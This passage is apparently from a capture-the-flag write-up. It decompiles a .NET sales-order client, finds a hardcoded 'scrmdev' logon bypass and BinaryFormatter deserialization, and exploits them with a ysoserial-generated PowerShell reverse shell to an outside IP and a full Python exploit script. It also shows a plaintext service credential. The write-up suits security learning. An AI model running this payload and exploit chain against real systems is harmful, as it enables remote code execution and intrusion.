d-----       01/11/2021     15:21                Production                                        
d-----       04/11/2021     22:23                Public                                            
d-----       03/11/2021     19:33                Sales                                             
```

```powershell
PS C:\shares> cd IT
PS C:\shares\IT> ls


    Directory: C:\shares\IT


Mode                LastWriteTime         Length Name                                              
----                -------------         ------ ----                                              
d-----       03/11/2021     21:06                Apps                                              
d-----       03/11/2021     19:32                Logs                                              
d-----       03/11/2021     19:32                Reports                                           


PS C:\shares\IT> cd Apps
PS C:\shares\IT\Apps> ls


    Directory: C:\shares\IT\Apps


Mode                LastWriteTime         Length Name                                              
----                -------------         ------ ----                                              
d-----       05/11/2021     20:57                Sales Order Client                                


PS C:\shares\IT\Apps> cd "Sales Order Client"
PS C:\shares\IT\Apps\Sales Order Client> ls


    Directory: C:\shares\IT\Apps\Sales Order Client


Mode                LastWriteTime         Length Name                                              
----                -------------         ------ ----                                              
-a----       05/11/2021     20:52          86528 ScrambleClient.exe                                
-a----       05/11/2021     20:52          19456 ScrambleLib.dll                  
```

Download these two over SMB.

```powershell
$ smbclient.py -k scrm.local/MiscSvc:ScrambledEggs9900@dc1.scrm.local -dc-ip dc1.scrm.local
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# ls
[-] No share selected
# shares
ADMIN$
C$
HR
IPC$
IT
NETLOGON
Public
Sales
SYSVOL
# use IT
# get Apps/Sales Order Client/ScrambleClient.exe
# get Apps/Sales Order Client/ScrambleLib.dll
```

```bash
$ file ScrambleClient.exe 
ScrambleClient.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

Setup [ILSpy](https://github.com/icsharpcode/ILSpy) to reverse engineer to DLL.

```bash
wget https://dotnet.microsoft.com/download/dotnet/scripts/v1/dotnet-install.sh
chmod +x dotnet-install.sh
./dotnet-install.sh --channel 8.0
```

```bash
dotnet --version
$ export PATH="$HOME/.dotnet:$PATH"
export DOTNET_ROOT="$HOME/.dotnet"
/home/ninjathebox98w1/.dotnet/tools/ilspycmd -p -o decompile ScrambleLib.dll
```

```bash
$ cd decompile/
$ ls
Properties  ScrambleLib  ScrambleLib.csproj  ScrambleLib.My  ScrambleLib.My.Resources
```
## Insecure Deserialization

```bash
~/decompile/ScrambleLib]
└──╼ [★]$ cat ScrambleNetClient.cs 
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace ScrambleLib;

public class ScrambleNetClient
{
	private const int NetworkReadTimeout = 20;

	public string Server { get; set; }

	public int Port { get; set; }

	public ScrambleNetClient()
	{
		Server = string.Empty;
		Port = 4411;
	}

	public bool Logon(string Username, string Password)
	{
		try
		{
			if (string.Compare(Username, "scrmdev", ignoreCase: true) == 0)
			{
				Log.Write("Developer logon bypass used");
				return true;
			}
			MD5 mD = MD5.Create();
			byte[] bytes = Encoding.ASCII.GetBytes(Password);
			Convert.ToBase64String(mD.ComputeHash(bytes, 0, bytes.Length));
			ScrambleNetResponse scrambleNetResponse = SendRequestAndGetResponse(new ScrambleNetRequest(ScrambleNetRequest.RequestType.AuthenticationRequest, Username + "|" + Password));
			switch (scrambleNetResponse.Type)
			{
			case ScrambleNetResponse.ResponseType.Success:
				Log.Write("Logon successful");
				return true;
			case ScrambleNetResponse.ResponseType.InvalidCredentials:
				Log.Write("Logon failed due to invalid credentials");
				return false;
			default:
				throw new ApplicationException(scrambleNetResponse.GetErrorDescription());
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Log.Write("Error: " + ex2.Message);
			throw ex2;
		}
	}

	public List<SalesOrder> GetOrders()
	{
		try
		{
			Log.Write("Getting orders from server");
			ScrambleNetResponse scrambleNetResponse = SendRequestAndGetResponse(new ScrambleNetRequest(ScrambleNetRequest.RequestType.ListOrders, null));
			if (scrambleNetResponse.Type == ScrambleNetResponse.ResponseType.Success)
			{
				List<SalesOrder> list = new List<SalesOrder>();
				if (!string.IsNullOrWhiteSpace(scrambleNetResponse.Data))
				{
					Log.Write("Splitting and parsing sales orders");
					string[] array = scrambleNetResponse.Data.TrimEnd(new char[0]).Split(new char[1] { '|' });
					Log.Write("Found " + Conversions.ToString(array.Length) + " sales orders in server response");
					string[] array2 = array;
					foreach (string text in array2)
					{
						Log.Write("Deserializing single sales order from base64: " + text);
						list.Add(SalesOrder.DeserializeFromBase64(text));
						Log.Write("Deserialization successful");
					}
					Log.Write("Finished deserializing all sales orders");
				}
				return list;
			}
			throw new ApplicationException(scrambleNetResponse.GetErrorDescription());
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Log.Write("Error: " + ex2.Message);
			throw ex2;
		}
	}

	public void UploadOrder(SalesOrder NewOrder)
	{
		try
		{
			Log.Write("Uploading new order with reference " + NewOrder.ReferenceNumber);
			string text = NewOrder.SerializeToBase64();
			Log.Write("Order serialized to base64: " + text);
			ScrambleNetResponse scrambleNetResponse = SendRequestAndGetResponse(new ScrambleNetRequest(ScrambleNetRequest.RequestType.UploadOrder, text));
			ScrambleNetResponse.ResponseType type = scrambleNetResponse.Type;
			if (type == ScrambleNetResponse.ResponseType.Success)
			{
				Log.Write("Upload successful");
				return;
			}
			throw new ApplicationException(scrambleNetResponse.GetErrorDescription());
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Log.Write("Error: " + ex2.Message);
			throw ex2;
		}
	}

	private ScrambleNetResponse SendRequestAndGetResponse(ScrambleNetRequest Request)
	{
		Log.Write("Connecting to server");
		TcpClient tcpClient = new TcpClient();
		tcpClient.ReceiveTimeout = checked((int)Math.Round(TimeSpan.FromSeconds(20.0).TotalMilliseconds));
		tcpClient.ReceiveBufferSize = 2048;
		tcpClient.SendBufferSize = 2048;
		tcpClient.Connect(Server, Port);
		try
		{
			using NetworkStream networkStream = tcpClient.GetStream();
			using StreamWriter streamWriter = new StreamWriter(networkStream, Encoding.ASCII);
			streamWriter.AutoFlush = true;
			if (GetResponse(networkStream).Type != ScrambleNetResponse.ResponseType.Banner)
			{
				throw new ApplicationException("Unexpected response from server on initial connection");
			}
			string text = ScrambleNetRequest.GetCodeFromMessageType(Request.Type) + ";" + Request.Parameter + "\n";
			Log.Write("Sending data to server: " + text);
			streamWriter.Write(text);
			Log.Write("Getting response from server");
			ScrambleNetResponse response = GetResponse(networkStream);
			try
			{
				byte[] bytes = Encoding.ASCII.GetBytes("QUIT\n");
				networkStream.Write(bytes, 0, bytes.Length);
				networkStream.Close();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Log.Write("Error sending QUIT and closing stream: " + ex2.Message);
				ProjectData.ClearProjectError();
			}
			return response;
		}
		finally
		{
			try
			{
				tcpClient.Close();
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				Log.Write("Error closing TCP connection: " + ex4.Message);
				ProjectData.ClearProjectError();
			}
		}
	}

	private ScrambleNetResponse GetResponse(NetworkStream NetStream)
	{
		StringBuilder stringBuilder = new StringBuilder();
		byte[] array = new byte[4096];
		NetStream.ReadTimeout = checked((int)Math.Round(TimeSpan.FromSeconds(20.0).TotalMilliseconds));
		string text;
		do
		{
			int num = NetStream.Read(array, 0, array.Length);
			if (num == 0)
			{
				break;
			}
			text = Encoding.ASCII.GetString(array, 0, num);
			stringBuilder.Append(text);
		}
		while (!text.EndsWith("\n"));
		string text2 = stringBuilder.ToString();
		if (string.IsNullOrWhiteSpace(text2))
		{
			throw new ApplicationException("No data received from server");
		}
		Log.Write("Received from server: " + text2);
		Log.Write("Parsing server response");
		return ScrambleNetResponse.FromString(text2);
	}
}
```

Here we see:

```cs
if (string.Compare(Username, "scrmdev", ignoreCase: true) == 0)
{
    Log.Write("Developer logon bypass used");
    return true;
}
```

- **Username**: `scrmdev` provides a developer bypass - no password required!
- TCP-based custom protocol
- Default port: 4411
- Request format: `Code;Parameter\n`
- Response parsing from server

**Available Operations**

- `Logon()` - Authentication
- `GetOrders()` - Retrieve sales orders
- `UploadOrder()` - Upload new orders

But we need more:

```bash
~/decompile/ScrambleLib]
└──╼ [★]$ cat SalesOrder.cs 
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;
using Microsoft.VisualBasic.CompilerServices;

namespace ScrambleLib;

[Serializable]
public class SalesOrder
{
	public bool IsComplete { get; set; }

	public string ReferenceNumber { get; set; }

	public string QuoteReference { get; set; }

	public string SalesRep { get; set; }

	public List<string> OrderItems { get; set; }

	public DateTime DueDate { get; set; }

	public double TotalCost { get; set; }

	public string DueDateDisplayText => DueDate.ToShortDateString();

	public SalesOrder()
	{
		ReferenceNumber = string.Empty;
		QuoteReference = string.Empty;
		SalesRep = string.Empty;
		OrderItems = new List<string>();
	}

	public string SerializeToBase64()
	{
		BinaryFormatter binaryFormatter = new BinaryFormatter();
		Log.Write("Binary formatter init successful");
		using MemoryStream memoryStream = new MemoryStream();
		binaryFormatter.Serialize(memoryStream, this);
		return Convert.ToBase64String(memoryStream.ToArray());
	}

	public static SalesOrder DeserializeFromBase64(string Base64)
	{
		try
		{
			byte[] buffer = Convert.FromBase64String(Base64);
			BinaryFormatter binaryFormatter = new BinaryFormatter();
			Log.Write("Binary formatter init successful");
			using MemoryStream serializationStream = new MemoryStream(buffer);
			return (SalesOrder)binaryFormatter.Deserialize(serializationStream);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			throw new ApplicationException("Error deserializing sales order: " + ex2.Message);
		}
	}
}
```

The code uses `BinaryFormatter` for serialization/deserialization:

```cs
public static SalesOrder DeserializeFromBase64(string Base64)
{
    byte[] buffer = Convert.FromBase64String(Base64);
    BinaryFormatter binaryFormatter = new BinaryFormatter();
    using MemoryStream serializationStream = new MemoryStream(buffer);
    return (SalesOrder)binaryFormatter.Deserialize(serializationStream); // DANGEROUS!
}
```

- `BinaryFormatter.Deserialize()` can execute arbitrary code during deserialization
- It's a known .NET vulnerability for Remote Code Execution (RCE)
- Microsoft has warned against using BinaryFormatter since it's insecure

Install [ysoserial](https://github.com/pwntester/ysoserial.net) to make the payload. (In Windows)

Last Reverse Shell:

```bash
PS C:\Temp\ysoserial\Release> .\ysoserial -f BinaryFormatter -g WindowsIdentity -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAyADIAIgAsADEAMgAzADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA" -o base64
AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAAxBdBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBOUE4OFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0T0NJL1BnMEtQRTlpYW1WamRFUmhkR0ZRY205MmFXUmxjaUJOWlhSb2IyUk9ZVzFsUFNKVGRHRnlkQ0lnU1hOSmJtbDBhV0ZzVEc5aFpFVnVZV0pzWldROUlrWmhiSE5sSWlCNGJXeHVjejBpYUhSMGNEb3ZMM05qYUdWdFlYTXViV2xqY205emIyWjBMbU52YlM5M2FXNW1lQzh5TURBMkwzaGhiV3d2Y0hKbGMyVnVkR0YwYVc5dUlpQjRiV3h1Y3pwelpEMGlZMnh5TFc1aGJXVnpjR0ZqWlRwVGVYTjBaVzB1UkdsaFoyNXZjM1JwWTNNN1lYTnpaVzFpYkhrOVUzbHpkR1Z0SWlCNGJXeHVjenA0UFNKb2RIUndPaTh2YzJOb1pXMWhjeTV0YVdOeWIzTnZablF1WTI5dEwzZHBibVo0THpJd01EWXZlR0Z0YkNJK0RRb2dJRHhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VDJKcVpXTjBTVzV6ZEdGdVkyVStEUW9nSUNBZ1BITmtPbEJ5YjJObGMzTStEUW9nSUNBZ0lDQThjMlE2VUhKdlkyVnpjeTVUZEdGeWRFbHVabTgrRFFvZ0lDQWdJQ0FnSUR4elpEcFFjbTlqWlhOelUzUmhjblJKYm1adklFRnlaM1Z0Wlc1MGN6MGlMMk1nY0c5M1pYSnphR1ZzYkNBdFpTQktRVUpxUVVkM1FXRlJRbXhCUnpSQlpFRkJaMEZFTUVGSlFVSlBRVWRWUVdSM1FYUkJSVGhCV1dkQ2NVRkhWVUZaZDBJd1FVTkJRVlYzUWpWQlNFMUJaRUZDYkVGSE1FRk1aMEpQUVVkVlFXUkJRWFZCUmsxQlluZENha0ZIYzBGYVVVSXdRVWhOUVV4blFsVkJSVTFCVlVGQ1JFRkhkMEZoVVVKc1FVYzBRV1JCUVc5QlEwbEJUVkZCZDBGRE5FRk5VVUYzUVVNMFFVMVJRVEJCUXpSQlRWRkJlVUZFU1VGSlowRnpRVVJGUVUxblFYcEJSRkZCUzFGQk4wRkRVVUZqZDBJd1FVaEpRVnBSUW1oQlJ6QkJTVUZCT1VGRFFVRktRVUpxUVVkM1FXRlJRbXhCUnpSQlpFRkJkVUZGWTBGYVVVSXdRVVpOUVdSQlFubEJSMVZCV1ZGQ2RFRkRaMEZMVVVFM1FVWnpRVmxuUWpWQlNGRkJXbEZDWWtGR01FRllVVUZyUVVkSlFXVlJRakJCUjFWQlkzZEJaMEZFTUVGSlFVRjNRVU0wUVV4blFUSkJSRlZCVGxGQmVrRkVWVUZtUVVGc1FVaHpRVTFCUWpsQlJITkJaSGRDYjBGSGEwRmlRVUpzUVVOblFVdEJRV3RCUjJ0QlNVRkJPVUZEUVVGS1FVSjZRVWhSUVdOblFteEJSMFZCWWxGQmRVRkdTVUZhVVVKb1FVZFJRVXRCUVd0QlIwbEJaVkZDTUVGSFZVRmpkMEZ6UVVOQlFVMUJRWE5CUTBGQlNrRkNhVUZJYTBGa1FVSnNRVWhOUVV4blFrMUJSMVZCWW1kQ2JrRklVVUZoUVVGd1FVTnJRVWxCUVhSQlJ6UkJXbEZCWjBGRVFVRkxVVUkzUVVSelFVcEJRbXRCUjBWQlpFRkNhRUZEUVVGUVVVRm5RVU5uUVZSblFteEJTR05CVEZGQ1VFRkhTVUZoWjBKc1FVZE5RV1JCUVdkQlF6QkJWa0ZDTlVGSVFVRmFVVUpQUVVkRlFXSlJRbXhCUTBGQlZYZENOVUZJVFVGa1FVSnNRVWN3UVV4blFsVkJSMVZCWlVGQ01FRkRORUZSVVVKVVFVVk5RVk5SUWtwQlJWVkJZbWRDYWtGSE9FRmFRVUp3UVVjMFFWcDNRWEJCUXpSQlVuZENiRUZJVVVGVmQwSXdRVWhKUVdGUlFuVkJSMk5CUzBGQmEwRkhTVUZsVVVJd1FVZFZRV04zUVhOQlJFRkJURUZCWjBGRFVVRmhVVUZ3UVVSelFVcEJRbnBCUjFWQlltZENhMEZIU1VGWlVVSnFRVWR6UVVsQlFUbEJRMEZCUzBGQ2NFRkhWVUZsUVVGblFVTlJRVnBCUW1oQlNGRkJXVkZCWjBGRVNVRlFaMEZ0UVVSRlFVbEJRamhCUTBGQlZIZENNVUZJVVVGTVVVSlVRVWhSUVdOblFuQkJSelJCV25kQlowRkRhMEZQZDBGclFVaE5RVnBSUW5WQlIxRkJXV2RDYUVGSFRVRmhkMEY1UVVOQlFWQlJRV2RCUTFGQlkzZENiRUZITkVGYVFVSnBRVWRGUVZsM1FuSkJRMEZCUzNkQlowRkRTVUZWUVVKVVFVTkJRVWxuUVdkQlEzTkJTVUZCYjBGSVFVRmtkMEpyUVVOclFVeG5RbEZCUjBWQlpFRkNiMEZEUVVGTGQwRm5RVU5KUVZCblFXZEJRMGxCVDNkQmEwRklUVUZhVVVKMVFVZFJRVmxuUWpWQlNGRkJXbEZCWjBGRU1FRkpRVUZ2UVVaelFXUkJRbXhCU0dkQlpFRkJkVUZIVlVGaVowSnFRVWM0UVZwQlFuQkJSelJCV25kQ1pFRkViMEZQWjBKQ1FVWk5RVkYzUWtwQlJXdEJTMUZCZFVGRlkwRmFVVUl3UVVWSlFXVlJRakJCUjFWQlkzZEJiMEZEVVVGamQwSnNRVWMwUVZwQlFtbEJSMFZCV1hkQ2NrRkVTVUZMVVVFM1FVTlJRV04zUWpCQlNFbEJXbEZDYUVGSE1FRk1aMEpZUVVoSlFXRlJRakJCUjFWQlMwRkJhMEZJVFVGYVVVSjFRVWRSUVZsblFqVkJTRkZCV2xGQmMwRkVRVUZNUVVGclFVaE5RVnBSUW5WQlIxRkJXV2RDTlVGSVVVRmFVVUYxUVVWM1FWcFJRblZCUjJOQlpFRkNiMEZEYTBGUGQwRnJRVWhOUVdSQlFubEJSMVZCV1ZGQ2RFRkRORUZTWjBKelFVaFZRV04zUW05QlEyZEJTMUZDT1VGRWMwRktRVUpxUVVkM1FXRlJRbXhCUnpSQlpFRkJkVUZGVFVGaVFVSjJRVWhOUVZwUlFXOUJRMnRCSWlCVGRHRnVaR0Z5WkVWeWNtOXlSVzVqYjJScGJtYzlJbnQ0T2s1MWJHeDlJaUJUZEdGdVpHRnlaRTkxZEhCMWRFVnVZMjlrYVc1blBTSjdlRHBPZFd4c2ZTSWdWWE5sY2s1aGJXVTlJaUlnVUdGemMzZHZjbVE5SW50NE9rNTFiR3g5SWlCRWIyMWhhVzQ5SWlJZ1RHOWhaRlZ6WlhKUWNtOW1hV3hsUFNKR1lXeHpaU0lnUm1sc1pVNWhiV1U5SW1OdFpDSWdMejROQ2lBZ0lDQWdJRHd2YzJRNlVISnZZMlZ6Y3k1VGRHRnlkRWx1Wm04K0RRb2dJQ0FnUEM5elpEcFFjbTlqWlhOelBnMEtJQ0E4TDA5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2k1UFltcGxZM1JKYm5OMFlXNWpaVDROQ2p3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeVBncz0L
```

1. **Connect to port 4411** using netcat or a simple Python script
2. **Authenticate** using the developer backdoor: `scrmdev` with any password
3. **Send the malicious serialized payload** using the `UPLOAD_ORDER` command

```python
#!/usr/bin/env python3
import socket
import sys

def exploit(target_ip, payload_base64):
    try:
        # Connect to the service on port 4411
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((target_ip, 4411))
        
        # Read banner
        banner = s.recv(1024)
        print(f"Banner: {banner.decode().strip()}")
        
        # Authenticate with developer backdoor (scrmdev)
        auth_cmd = b"AUTH;scrmdev|anything\n"
        print(f"Sending auth: {auth_cmd.decode().strip()}")
        s.send(auth_cmd)
        auth_response = s.recv(1024)
        print(f"Auth response: {auth_response.decode().strip()}")
        
        # Send malicious payload as UPLOAD_ORDER
        upload_cmd = f"UPLOAD_ORDER;{payload_base64}\n".encode()
        print("Sending malicious payload...")
        s.send(upload_cmd)
        
        # Try to receive response
        try:
            upload_response = s.recv(4096)
            print(f"Upload response: {upload_response.decode().strip()}")
        except socket.timeout:
            print("No response received (timeout) - payload may have executed")
        
        s.close()
        print("Exploit completed")
        
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <target_ip> <payload_base64>")
        print("Example: python3 exploit.py 10.129.161.93 'AAEAAAD...'")
        sys.exit(1)
    
    exploit(sys.argv[1], sys.argv[2])
```

```bash
$ python3 exploit.py 10.129.161.93 "AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAAxBdBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBOUE4OFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0T0NJL1BnMEtQRTlpYW1WamRFUmhkR0ZRY205MmFXUmxjaUJOWlhSb2IyUk9ZVzFsUFNKVGRHRnlkQ0lnU1hOSmJtbDBhV0ZzVEc5aFpFVnVZV0pzWldROUlrWmhiSE5sSWlCNGJXeHVjejBpYUhSMGNEb3ZMM05qYUdWdFlYTXViV2xqY205emIyWjBMbU52YlM5M2FXNW1lQzh5TURBMkwzaGhiV3d2Y0hKbGMyVnVkR0YwYVc5dUlpQjRiV3h1Y3pwelpEMGlZMnh5TFc1aGJXVnpjR0ZqWlRwVGVYTjBaVzB1UkdsaFoyNXZjM1JwWTNNN1lYTnpaVzFpYkhrOVUzbHpkR1Z0SWlCNGJXeHVjenA0UFNKb2RIUndPaTh2YzJOb1pXMWhjeTV0YVdOeWIzTnZablF1WTI5dEwzZHBibVo0THpJd01EWXZlR0Z0YkNJK0RRb2dJRHhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VDJKcVpXTjBTVzV6ZEdGdVkyVStEUW9nSUNBZ1BITmtPbEJ5YjJObGMzTStEUW9nSUNBZ0lDQThjMlE2VUhKdlkyVnpjeTVUZEdGeWRFbHVabTgrRFFvZ0lDQWdJQ0FnSUR4elpEcFFjbTlqWlhOelUzUmhjblJKYm1adklFRnlaM1Z0Wlc1MGN6MGlMMk1nY0c5M1pYSnphR1ZzYkNBdFpTQktRVUpxUVVkM1FXRlJRbXhCUnpSQlpFRkJaMEZFTUVGSlFVSlBRVWRWUVdSM1FYUkJSVGhCV1dkQ2NVRkhWVUZaZDBJd1FVTkJRVlYzUWpWQlNFMUJaRUZDYkVGSE1FRk1aMEpQUVVkVlFXUkJRWFZCUmsxQlluZENha0ZIYzBGYVVVSXdRVWhOUVV4blFsVkJSVTFCVlVGQ1JFRkhkMEZoVVVKc1FVYzBRV1JCUVc5QlEwbEJUVkZCZDBGRE5FRk5VVUYzUVVNMFFVMVJRVEJCUXpSQlRWRkJlVUZFU1VGSlowRnpRVVJGUVUxblFYcEJSRkZCUzFGQk4wRkRVVUZqZDBJd1FVaEpRVnBSUW1oQlJ6QkJTVUZCT1VGRFFVRktRVUpxUVVkM1FXRlJRbXhCUnpSQlpFRkJkVUZGWTBGYVVVSXdRVVpOUVdSQlFubEJSMVZCV1ZGQ2RFRkRaMEZMVVVFM1FVWnpRVmxuUWpWQlNGRkJXbEZDWWtGR01FRllVVUZyUVVkSlFXVlJRakJCUjFWQlkzZEJaMEZFTUVGSlFVRjNRVU0wUVV4blFUSkJSRlZCVGxGQmVrRkVWVUZtUVVGc1FVaHpRVTFCUWpsQlJITkJaSGRDYjBGSGEwRmlRVUpzUVVOblFVdEJRV3RCUjJ0QlNVRkJPVUZEUVVGS1FVSjZRVWhSUVdOblFteEJSMFZCWWxGQmRVRkdTVUZhVVVKb1FVZFJRVXRCUVd0QlIwbEJaVkZDTUVGSFZVRmpkMEZ6UVVOQlFVMUJRWE5CUTBGQlNrRkNhVUZJYTBGa1FVSnNRVWhOUVV4blFrMUJSMVZCWW1kQ2JrRklVVUZoUVVGd1FVTnJRVWxCUVhSQlJ6UkJXbEZCWjBGRVFVRkxVVUkzUVVSelFVcEJRbXRCUjBWQlpFRkNhRUZEUVVGUVVVRm5RVU5uUVZSblFteEJTR05CVEZGQ1VFRkhTVUZoWjBKc1FVZE5RV1JCUVdkQlF6QkJWa0ZDTlVGSVFVRmFVVUpQUVVkRlFXSlJRbXhCUTBGQlZYZENOVUZJVFVGa1FVSnNRVWN3UVV4blFsVkJSMVZCWlVGQ01FRkRORUZSVVVKVVFVVk5RVk5SUWtwQlJWVkJZbWRDYWtGSE9FRmFRVUp3UVVjMFFWcDNRWEJCUXpSQlVuZENiRUZJVVVGVmQwSXdRVWhKUVdGUlFuVkJSMk5CUzBGQmEwRkhTVUZsVVVJd1FVZFZRV04zUVhOQlJFRkJURUZCWjBGRFVVRmhVVUZ3UVVSelFVcEJRbnBCUjFWQlltZENhMEZIU1VGWlVVSnFRVWR6UVVsQlFUbEJRMEZCUzBGQ2NFRkhWVUZsUVVGblFVTlJRVnBCUW1oQlNGRkJXVkZCWjBGRVNVRlFaMEZ0UVVSRlFVbEJRamhCUTBGQlZIZENNVUZJVVVGTVVVSlVRVWhSUVdOblFuQkJSelJCV25kQlowRkRhMEZQZDBGclFVaE5RVnBSUW5WQlIxRkJXV2RDYUVGSFRVRmhkMEY1UVVOQlFWQlJRV2RCUTFGQlkzZENiRUZITkVGYVFVSnBRVWRGUVZsM1FuSkJRMEZCUzNkQlowRkRTVUZWUVVKVVFVTkJRVWxuUVdkQlEzTkJTVUZCYjBGSVFVRmtkMEpyUVVOclFVeG5RbEZCUjBWQlpFRkNiMEZEUVVGTGQwRm5RVU5KUVZCblFXZEJRMGxCVDNkQmEwRklUVUZhVVVKMVFVZFJRVmxuUWpWQlNGRkJXbEZCWjBGRU1FRkpRVUZ2UVVaelFXUkJRbXhCU0dkQlpFRkJkVUZIVlVGaVowSnFRVWM0UVZwQlFuQkJSelJCV25kQ1pFRkViMEZQWjBKQ1FVWk5RVkYzUWtwQlJXdEJTMUZCZFVGRlkwRmFVVUl3UVVWSlFXVlJRakJCUjFWQlkzZEJiMEZEVVVGamQwSnNRVWMwUVZwQlFtbEJSMFZCV1hkQ2NrRkVTVUZMVVVFM1FVTlJRV04zUWpCQlNFbEJXbEZDYUVGSE1FRk1aMEpZUVVoSlFXRlJRakJCUjFWQlMwRkJhMEZJVFVGYVVVSjFRVWRSUVZsblFqVkJTRkZCV2xGQmMwRkVRVUZNUVVGclFVaE5RVnBSUW5WQlIxRkJXV2RDTlVGSVVVRmFVVUYxUVVWM1FWcFJRblZCUjJOQlpFRkNiMEZEYTBGUGQwRnJRVWhOUVdSQlFubEJSMVZCV1ZGQ2RFRkRORUZTWjBKelFVaFZRV04zUW05QlEyZEJTMUZDT1VGRWMwRktRVUpxUVVkM1FXRlJRbXhCUnpSQlpFRkJkVUZGVFVGaVFVSjJRVWhOUVZwUlFXOUJRMnRCSWlCVG